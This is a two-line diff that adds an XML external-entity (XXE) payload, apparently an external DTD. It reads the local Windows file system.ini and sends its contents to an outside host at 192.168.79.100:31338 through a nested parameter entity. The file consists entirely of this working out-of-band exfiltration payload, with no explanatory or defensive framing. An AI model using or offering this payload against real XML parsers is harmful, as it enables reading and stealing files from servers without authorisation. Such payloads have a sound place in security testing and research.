@@ -1,0 +1,2 @@
+<!ENTITY % payload SYSTEM 'file://C:\Windows\system.ini'>
+<!ENTITY % param1 "<!ENTITY &#x25; trick SYSTEM 'http://192.168.79.100:31338/?%payload;'>">
